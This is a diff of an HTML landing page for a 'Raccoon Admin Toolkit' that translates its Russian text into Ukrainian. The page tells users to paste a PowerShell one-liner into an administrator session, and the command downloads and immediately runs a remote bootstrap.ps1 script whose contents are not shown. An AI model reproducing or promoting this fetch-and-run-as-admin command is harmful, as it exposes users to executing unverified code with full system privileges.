@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="ru">
+<html lang="uk">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,27 +25,27 @@ footer{margin-top:34px;padding-top:20px;border-top:1px solid rgba(159,185,204,.2
 <body>
 <main>
 <p class="eyebrow">Raccoon Admin Toolkit</p>
-<h1>Здрасте. Но это только для Windows.</h1>
-<p class="lead">Это не обычный сайт, а служебный набор диагностических PowerShell-инструментов для технических специалистов.</p>
-<div class="notice">Не запускайте его в браузере, на телефоне или на macOS. Нужен компьютер с Windows и Windows PowerShell 3.0 или новее.</div>
+<h1>Вітаю. Але це лише для Windows.</h1>
+<p class="lead">Це не звичайний сайт, а службовий набір діагностичних PowerShell-інструментів для технічних фахівців.</p>
+<div class="notice">Не запускайте його у браузері, на телефоні або на macOS. Потрібен комп’ютер із Windows та Windows PowerShell 3.0 або новішої версії.</div>
 <section>
-<h2>Как запустить</h2>
+<h2>Як запустити</h2>
 <ol>
-<li>Откройте Windows PowerShell от имени администратора.</li>
-<li>Скопируйте команду ниже целиком.</li>
-<li>Вставьте её в PowerShell и нажмите Enter.</li>
+<li>Відкрийте Windows PowerShell від імені адміністратора.</li>
+<li>Скопіюйте наведену нижче команду повністю.</li>
+<li>Вставте її у PowerShell і натисніть Enter.</li>
 </ol>
 <div class="command">
 <code id="cmd">irm https://admintoolkit.itraccoonverse.space/bootstrap.ps1 | iex</code>
-<button type="button" id="copy" title="Скопировать">⧉</button>
+<button type="button" id="copy" title="Скопіювати">⧉</button>
 </div>
-<p class="small" id="status">После завершения работы выберите пункт выхода в меню.</p>
+<p class="small" id="status">Після завершення роботи оберіть пункт виходу в меню.</p>
 </section>
-<footer>Инструмент предназначен только для авторизованных технических специалистов.</footer>
+<footer>Інструмент призначений лише для авторизованих технічних фахівців.</footer>
 </main>
 <script>
 const b=document.getElementById("copy"),c=document.getElementById("cmd"),s=document.getElementById("status");
-b.addEventListener("click",async()=>{try{await navigator.clipboard.writeText(c.textContent.trim());b.textContent="✓";s.textContent="Команда скопирована. Вставьте её в PowerShell."}catch{const r=document.createRange();r.selectNodeContents(c);const x=getSelection();x.removeAllRanges();x.addRange(r);s.textContent="Команда выделена. Нажмите Ctrl+C."}});
+b.addEventListener("click",async()=>{try{await navigator.clipboard.writeText(c.textContent.trim());b.textContent="✓";s.textContent="Команду скопійовано. Вставте її у PowerShell."}catch{const r=document.createRange();r.selectNodeContents(c);const x=getSelection();x.removeAllRanges();x.addRange(r);s.textContent="Команду виділено. Натисніть Ctrl+C."}});
 </script>
 </body>
 </html>
